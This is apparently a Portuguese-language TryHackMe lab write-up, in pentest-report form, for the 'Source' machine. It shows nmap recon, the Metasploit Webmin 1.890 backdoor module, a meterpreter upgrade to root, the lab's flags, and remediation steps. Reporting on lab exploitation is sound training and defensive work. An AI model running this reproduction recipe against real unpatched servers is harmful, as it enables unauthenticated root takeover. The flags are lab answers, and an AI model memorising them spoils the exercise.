# Report — Máquina: `Source` — `10.67.170.253 / 10.67.140.212`

- **Fonte:** THM
    
- **Data:** 2025-12-11
    
- **Autor:** Enrico Moreno
    
- **Nível:** easy
    
- **Tempo gasto:** ~56 min (16:58 → 17:54, com interrupções por máquina offline)
    

---

## 1) Executive summary

Servidor Webmin 1.890 vulnerável a backdoor público permitiu execução remota de comandos e acesso root. Flags `THM{SUPPLY_CHAIN_COMPROMISE}` e `THM{UPDATE_YOUR_INSTALL}` obtidas.

---

## 2) Escopo

- **Alvo(s) testados:**
    
    - `https://10.67.170.253:10000/`
        
    - Após reinicialização: `https://10.67.140.212:10000/`
        
- **Ferramentas autorizadas:**
    
    - nmap, ffuf, Metasploit
        
- **Limitações:**
    
    - Sem brute force extensivo
        
    - Sem pivoting
        
    - Apenas exploração direta de serviços identificados
        

---

## 3) Metodologia aplicada

- **Recon:** Nmap (full ports + version + OS detection).
    
- **Enumeração:** Acesso HTTPS à interface Webmin; ffuf para diretórios.
    
- **Análise:** Busca por CVEs/exploits da versão Webmin 1.890, identificação de backdoor conhecido.
    
- **Exploração:** Exploit Metasploit `linux/http/webmin_backdoor`.
    
- **Pós-exploração:** Upgrade shell → meterpreter; verificação de privilégios; coleta de flags.
    
- **Reporting:** Consolidação dos achados.
    

---

## 4) Achado principal

**Vulnerabilidade:** Webmin 1.890 Backdoor (RCE — Remote Command Execution)  
**Local / Endpoint:** `https://<IP>:10000/`  
**PoC curta:** Execução remota de comandos via payload do módulo Metasploit.  
**Flag / Artefato:**

- `/home/dark/user.txt` → `THM{SUPPLY_CHAIN_COMPROMISE}`
    
- `/root/root.txt` → `THM{UPDATE_YOUR_INSTALL}`
    

---

## 5) Evidências / PoC (resumo)

### Nmap

`nmap -sS -sV -Pn -O -p- -T4 10.67.170.253 -oN ~/Desktop/Nmap_Source.txt  Host is up (0.22s latency). PORT      STATE SERVICE VERSION 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 10000/tcp open  http    MiniServ 1.890 (Webmin httpd)`

### Shell → root

`meterpreter > shell /bin/bash -i root@source:/usr/share/webmin# whoami root`

### Flags

`/home/dark/user.txt → THM{SUPPLY_CHAIN_COMPROMISE} /root/root.txt       → THM{UPDATE_YOUR_INSTALL}`

---

## 6) Impacto & Severidade (justifique)

**Severidade:** Alta  
**Justificativa:** Versão do Webmin afetada por backdoor que permite execução arbitrária de comandos sem autenticação, resultando em comprometimento total do servidor (root), acesso a dados sensíveis e controle completo da máquina.

---

## 7) Reproduzir (passo-a-passo reprodutível)

1. **Nmap Recon**
    
    `nmap -sS -sV -Pn -O -p- -T4 <IP>`
    
2. **Descobrir serviço vulnerável Webmin 1.890**
    
    - Acessar `https://<IP>:10000/`
        
    - Identificar versão no banner.
        
3. **Enumeração com ffuf**
    
    `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \      -u https://<IP>:10000/FUZZ`
    
    - Sem resultados relevantes.
        
4. **Exploração via Metasploit**
    
    `use linux/http/webmin_backdoor set RHOSTS <IP> set RPORT 10000 run`
    
5. **Upgrade para meterpreter**
    
    `use multi/manage/shell_to_meterpreter set SESSION <id> run`
    
6. **Pós-exploração**
    
    `whoami   # root cat /home/dark/user.txt cat /root/root.txt`
    

---

## 8) Recomendações (rápidas para gestor)

- Atualizar imediatamente o Webmin para versão corrigida (≥ 1.930).
    
- Revogar acesso externo à porta 10000 e restringir a rede administrativa.
    
- Monitorar logs para identificar indícios de exploração prévia.
    

---

## 9) Recomendações técnicas (passo-a-passo)

### Correções no software

- Atualizar Webmin para versão segura e verificar checksums oficiais.
    
- Desativar autenticação remota via root.
    
- Habilitar apenas TLS forte em MiniServ (desabilitar protocolos inseguros).
    

### Endurecimento do servidor

- Restringir o serviço a localhost e usar SSH tunelado para acesso administrativo:
    
    `bind=127.0.0.1`
    
- Integrar firewall (ufw/iptables):
    
    `ufw deny 10000/tcp ufw allow from <admin-net> to any port 10000`
    

### Remediação pós-incidente

- Verificar integridade do sistema:
    
    - Arquivos alterados em `/usr/share/webmin/`
        
    - Crontabs estranhos
        
    - Autoruns: `/etc/systemd/system/`, `/etc/init.d/`
        
- Rotacionar senhas e chaves SSH.
    
- Reinstalar pacote Webmin de fonte confiável (assinatura GPG oficial).
    

### Validação pós-correção

- Novo scan:
    
    `nmap -sV -p10000 <IP>`
    
- Testar que o exploit Metasploit não funciona mais.
    

---

## 10) Apêndice técnico

### Nmap (comando usado)

`nmap -sS -sV -Pn -O -p- -T4 10.67.170.253 -oN Nmap_Source.txt`

### Arquivo .txt do Nmap

![](Nmap_Source.txt)

### Observações adicionais

- A máquina caiu durante o processo, alterando o IP para `10.67.140.212`.
    
- Não houve impacto metodológico, apenas tempo adicional para troubleshooting.
    

---

## 11) Lições aprendidas / follow-up

- Revisar exploração de backdoors conhecidos em serviços expostos.
    
- Boa prática: sempre checar versão exata de Webmin (frequentemente vulnerável).
    
- Reteste recomendado após atualização do serviço.